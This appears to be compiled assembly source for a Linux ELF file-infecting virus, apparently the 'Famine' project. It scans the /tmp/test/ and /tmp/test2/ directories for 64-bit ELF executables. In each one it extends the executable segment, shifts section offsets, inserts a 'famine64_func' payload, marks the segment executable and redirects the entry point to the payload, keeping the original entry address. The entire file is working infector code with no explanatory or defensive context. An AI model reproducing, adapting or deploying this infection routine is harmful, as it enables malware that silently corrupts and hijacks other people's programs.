	.file	"main.c"
	.intel_syntax noprefix
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"OPEN file failed\n"
.LC1:
	.string	"WRITE failed"
	.text
	.p2align 4,,15
	.globl	pack_dat_elf
	.type	pack_dat_elf, @function
pack_dat_elf:
.LFB38:
	.cfi_startproc
	cmp	BYTE PTR [rdx], 127
	je	.L31
.L29:
	ret
	.p2align 4,,10
	.p2align 3
.L31:
	cmp	BYTE PTR 1[rdx], 69
	jne	.L29
	cmp	BYTE PTR 2[rdx], 76
	jne	.L29
	cmp	BYTE PTR 3[rdx], 70
	jne	.L29
	cmp	BYTE PTR 4[rdx], 2
	jne	.L29
	cmp	BYTE PTR 5[rdx], 0
	je	.L29
	cmp	BYTE PTR 6[rdx], 1
	jne	.L29
	movzx	eax, BYTE PTR 16[rdx]
	sub	eax, 2
	cmp	al, 1
	ja	.L29
	movzx	ecx, WORD PTR 56[rdx]
	mov	r8, QWORD PTR 32[rdx]
	test	rcx, rcx
	je	.L29
	imul	rcx, rcx, 56
	push	r13
	.cfi_def_cfa_offset 16
	.cfi_offset 13, -16
	push	r12
	.cfi_def_cfa_offset 24
	.cfi_offset 12, -24
	push	rbp
	.cfi_def_cfa_offset 32
	.cfi_offset 6, -32
	push	rbx
	.cfi_def_cfa_offset 40
	.cfi_offset 3, -40
	lea	rax, [rdx+r8]
	xor	ebx, ebx
	sub	rsp, 24
	.cfi_def_cfa_offset 64
	add	rcx, r8
	add	rcx, rdx
	jmp	.L5
	.p2align 4,,10
	.p2align 3
.L4:
	add	rax, 56
	cmp	rax, rcx
	je	.L32
.L5:
	cmp	DWORD PTR [rax], 1
	jne	.L4
	test	rbx, rbx
	je	.L15
	mov	r10, QWORD PTR 16[rbx]
	cmp	QWORD PTR 16[rax], r10
	cmova	rbx, rax
	jmp	.L4
.L32:
	test	rbx, rbx
	je	.L1
	movzx	ecx, WORD PTR 60[rdx]
	mov	r9, QWORD PTR 40[rbx]
	mov	r11, QWORD PTR 40[rdx]
	mov	r10d, DWORD PTR famine64_size[rip]
	mov	rbp, r9
	add	rbp, QWORD PTR 8[rbx]
	test	rcx, rcx
	je	.L11
	sal	rcx, 6
	lea	rax, [rdx+r11]
	mov	r8, rcx
	add	r8, r11
	add	r8, rdx
.L10:
	mov	rcx, QWORD PTR 24[rax]
	cmp	rbp, rcx
	ja	.L9
	add	rcx, r10
	mov	QWORD PTR 24[rax], rcx
.L9:
	add	rax, 64
	cmp	r8, rax
	jne	.L10
.L11:
	mov	rax, r9
	add	rax, QWORD PTR 16[rbx]
	mov	rcx, QWORD PTR 24[rdx]
	add	r11, r10
	mov	QWORD PTR 40[rdx], r11
	mov	QWORD PTR 8[rsp], rcx
	mov	QWORD PTR 24[rdx], rax
	mov	eax, DWORD PTR 4[rbx]
	test	al, 1
	jne	.L8
	or	eax, 1
	mov	DWORD PTR 4[rbx], eax
.L8:
	add	r9, r10
	xor	eax, eax
	mov	rbp, rdx
	mov	r12d, esi
	mov	QWORD PTR 40[rbx], r9
	mov	rsi, rdi
	mov	QWORD PTR 32[rbx], r9
	mov	ecx, 493
	mov	edx, 65
	mov	edi, 2
	call	syscall@PLT
	cmp	eax, -1
	mov	r13, rax
	je	.L33
	mov	rax, QWORD PTR 40[rbx]
	add	rax, QWORD PTR 8[rbx]
	mov	rsi, rbp
	mov	edi, r13d
	mov	rbx, rax
	mov	eax, DWORD PTR famine64_size[rip]
	sub	rbx, rax
	mov	rdx, rbx
	call	write@PLT
	test	rax, rax
	jle	.L34
	mov	edx, DWORD PTR famine64_size[rip]
	mov	rsi, QWORD PTR famine64_func@GOTPCREL[rip]
	mov	edi, r13d
	sub	rdx, 8
	call	write@PLT
	test	rax, rax
	jle	.L1
	lea	rsi, 8[rsp]
	mov	edx, 8
	mov	edi, r13d
	call	write@PLT
	test	rax, rax
	jle	.L1
	movsx	rdx, r12d
	lea	rsi, 0[rbp+rbx]
	mov	edi, r13d
	sub	rdx, rbx
	call	write@PLT
	test	rax, rax
	jg	.L35
.L1:
	add	rsp, 24
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_restore 3
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_restore 6
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_restore 12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_restore 13
	.cfi_def_cfa_offset 8
	ret
.L15:
	.cfi_restore_state
	mov	rbx, rax
	jmp	.L4
.L34:
	lea	rdi, .LC1[rip]
	call	perror@PLT
	jmp	.L1
.L33:
	lea	rsi, .LC0[rip]
	mov	edx, 17
	mov	edi, 1
	call	write@PLT
	jmp	.L1
.L35:
	mov	esi, r13d
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
	jmp	.L1
	.cfi_endproc
.LFE38:
	.size	pack_dat_elf, .-pack_dat_elf
	.section	.rodata.str1.1
.LC2:
	.string	"SEEK file failed\n"
.LC3:
	.string	"MMAP file failed\n"
	.text
	.p2align 4,,15
	.globl	get_dat_elf
	.type	get_dat_elf, @function
get_dat_elf:
.LFB37:
	.cfi_startproc
	push	r13
	.cfi_def_cfa_offset 16
	.cfi_offset 13, -16
	push	r12
	.cfi_def_cfa_offset 24
	.cfi_offset 12, -24
	push	rbp
	.cfi_def_cfa_offset 32
	.cfi_offset 6, -32
	push	rbx
	.cfi_def_cfa_offset 40
	.cfi_offset 3, -40
	sub	rsp, 1032
	.cfi_def_cfa_offset 1072
	movzx	edx, BYTE PTR [rdi]
	test	dl, dl
	je	.L46
	lea	r8, -1[rsp]
	mov	eax, 1
	.p2align 4,,10
	.p2align 3
.L38:
	mov	BYTE PTR [r8+rax], dl
	mov	ecx, eax
	add	rax, 1
	movzx	edx, BYTE PTR -1[rdi+rax]
	test	dl, dl
	jne	.L38
.L37:
	movzx	edx, BYTE PTR [rsi]
	test	dl, dl
	je	.L53
	movsx	rdi, ecx
	mov	eax, 1
	mov	rbx, rsp
	add	rdi, rsp
	.p2align 4,,10
	.p2align 3
.L40:
	mov	BYTE PTR -1[rdi+rax], dl
	mov	r8d, eax
	add	rax, 1
	movzx	edx, BYTE PTR -1[rsi+rax]
	test	dl, dl
	jne	.L40
	add	ecx, r8d
.L39:
	movsx	rcx, ecx
	xor	eax, eax
	mov	edx, 2050
	mov	BYTE PTR [rsp+rcx], 0
	mov	rsi, rbx
	xor	ecx, ecx
	mov	edi, 2
	call	syscall@PLT
	cmp	eax, -1
	mov	rbp, rax
	je	.L54
	mov	esi, eax
	mov	ecx, 2
	xor	eax, eax
	mov	edx, 1
	mov	edi, 8
	call	syscall@PLT
	cmp	eax, -1
	mov	r12, rax
	je	.L55
	sub	rsp, 8
	.cfi_def_cfa_offset 1080
	mov	edx, eax
	xor	esi, esi
	push	0
	.cfi_def_cfa_offset 1088
	xor	eax, eax
	mov	r9d, ebp
	mov	r8d, 2
	mov	ecx, 3
	mov	edi, 9
	call	syscall@PLT
	mov	r13, rax
	cmp	r13, -1
	pop	rax
	.cfi_def_cfa_offset 1080
	pop	rdx
	.cfi_def_cfa_offset 1072
	je	.L56
	mov	esi, ebp
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
	mov	rdx, r13
	mov	esi, r12d
	mov	rdi, rbx
	call	pack_dat_elf
	mov	edx, r12d
	mov	rsi, r13
	mov	edi, 11
	xor	eax, eax
	call	syscall@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L54:
	.cfi_restore_state
	lea	rsi, .LC0[rip]
	mov	edx, 17
	mov	edi, 1
	call	write@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L55:
	.cfi_restore_state
	lea	rsi, .LC2[rip]
	mov	edx, 17
	mov	edi, 1
	call	write@PLT
	mov	edi, ebp
	call	close@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L56:
	.cfi_restore_state
	lea	rsi, .LC3[rip]
	mov	edx, 17
	mov	edi, 1
	call	write@PLT
	mov	edi, ebp
	call	close@PLT
	add	rsp, 1032
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_def_cfa_offset 8
	ret
.L46:
	.cfi_restore_state
	xor	ecx, ecx
	jmp	.L37
.L53:
	mov	rbx, rsp
	jmp	.L39
	.cfi_endproc
.LFE37:
	.size	get_dat_elf, .-get_dat_elf
	.p2align 4,,15
	.globl	find_files
	.type	find_files, @function
find_files:
.LFB36:
	.cfi_startproc
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	xor	ecx, ecx
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	mov	rsi, rdi
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	xor	eax, eax
	mov	r13, rdi
	mov	edx, 591872
	mov	edi, 2
	sub	rsp, 1048
	.cfi_def_cfa_offset 1104
	call	syscall@PLT
	mov	QWORD PTR 8[rsp], rax
	mov	r14d, DWORD PTR 8[rsp]
	lea	r12, 16[rsp]
	cmp	r14d, -1
	je	.L57
	.p2align 4,,10
	.p2align 3
.L59:
	xor	eax, eax
	mov	ecx, 1023
	mov	rdx, r12
	mov	esi, r14d
	mov	edi, 217
	call	syscall@PLT
	test	eax, eax
	mov	r15d, eax
	jle	.L66
	xor	ebx, ebx
	jmp	.L61
	.p2align 4,,10
	.p2align 3
.L60:
	movsx	eax, BYTE PTR 32[rsp+rbp]
	add	ebx, eax
	cmp	r15d, ebx
	jle	.L59
.L61:
	movsx	rbp, ebx
	cmp	BYTE PTR 34[rsp+rbp], 8
	jne	.L60
	lea	rsi, 19[r12+rbp]
	mov	rdi, r13
	call	get_dat_elf
	jmp	.L60
.L66:
	mov	esi, DWORD PTR 8[rsp]
	mov	edi, 3
	xor	eax, eax
	call	syscall@PLT
.L57:
	add	rsp, 1048
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE36:
	.size	find_files, .-find_files
	.section	.text.startup,"ax",@progbits
	.p2align 4,,15
	.globl	main
	.type	main, @function
main:
.LFB35:
	.cfi_startproc
	sub	rsp, 8
	.cfi_def_cfa_offset 16
	mov	rdi, QWORD PTR direct[rip]
	call	find_files
	mov	rdi, QWORD PTR direct[rip+8]
	call	find_files
	xor	eax, eax
	add	rsp, 8
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE35:
	.size	main, .-main
	.globl	direct
	.section	.rodata.str1.1
.LC4:
	.string	"/tmp/test/"
.LC5:
	.string	"/tmp/test2/"
	.section	.data.rel.local,"aw",@progbits
	.align 16
	.type	direct, @object
	.size	direct, 24
direct:
	.quad	.LC4
	.quad	.LC5
	.quad	0
	.ident	"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",@progbits
